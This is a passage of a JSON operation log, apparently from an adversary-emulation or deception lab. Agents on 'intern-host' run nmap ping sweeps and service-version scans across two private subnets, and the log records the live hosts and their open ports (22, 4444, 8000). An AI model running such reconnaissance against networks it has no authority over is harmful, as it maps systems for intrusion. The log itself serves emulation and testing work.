"command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["59b4d7fe-d671-428b-b097-5c860ed68448", "9c43e5e0-30e5-4175-b574-10e29aa9e5c4", "c902d664-8a84-4ff2-8d31-372b5662c6e5"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T22:19:27Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.156', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156', '192.168.200.3'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["59b4d7fe-d671-428b-b097-5c860ed68448"], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.156", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.156', '192.168.200.7']", "created": "2023-10-09T22:19:27Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.156', '192.168.200.7'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:19:25Z"}, {"deadman": false, "finish": "2023-10-09T22:19:54Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "201cc0c4-87d0-40d4-adce-d4b10be0053e", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-09T22:19:31Z", "relationships": []}], "unique": "201cc0c4-87d0-40d4-adce-d4b10be0053e", "decide": "2023-10-09T22:19:31Z", "status": 0, "score": 1, "pid": "1208", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": null, "value": [], "unique": "host.subnet.online_ipaddrs[]", "created": "2023-10-09T22:19:54Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T22:19:54Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4adba0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4ae530>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:19:33Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["201cc0c4-87d0-40d4-adce-d4b10be0053e", "c8af7bad-aa2d-4cc5-b818-d5a1f0244faa", "69651246-38d3-4785-9ca4-b8e1602794d1"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T22:19:54Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.91'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.91', '192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:19:33Z"}, {"deadman": false, "finish": "2023-10-09T22:20:14Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "6886aa43-7f5c-420a-8780-09ca6f83030a", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.1,2,3,4,5,6,156,7", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 13, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.1,2,3,4,5,6,156,7", "unique": "scan.remote.addr192.168.200.1,2,3,4,5,6,156,7", "created": "2023-10-09T22:19:56Z", "relationships": []}], "unique": "6886aa43-7f5c-420a-8780-09ca6f83030a", "decide": "2023-10-09T22:19:56Z", "status": 0, "score": 1, "pid": "1211", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71aa603a0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71aa63100>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a41b460>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a41bfd0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4181c0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71ab0c6a0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71ab0ff70>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71ab0f4c0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a636c50>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a636800>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a634a60>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6344f0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a636140>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a634ac0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a637400>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a6357b0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["4444", "krb524"], ["22", "ssh"]], "unique": "host.remote.port_services[('4444', 'krb524'), ('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4af550>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4ac250>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4ae560>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4ad420>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["8000", "ssh"], ["22", "ssh"]], "unique": "host.remote.port_services[('8000', 'ssh'), ('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4af760>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4aff10>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:20:14Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4ac190>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a4aec50>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "tubxdc", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:19:59Z", "command": "nmap -sV --version-light -oX - 192.168.200.1,2,3,4,5,6,156,7", "facts": [{"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.156) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.201.91) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a"], "collected_by": ["tubxdc"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["8000", 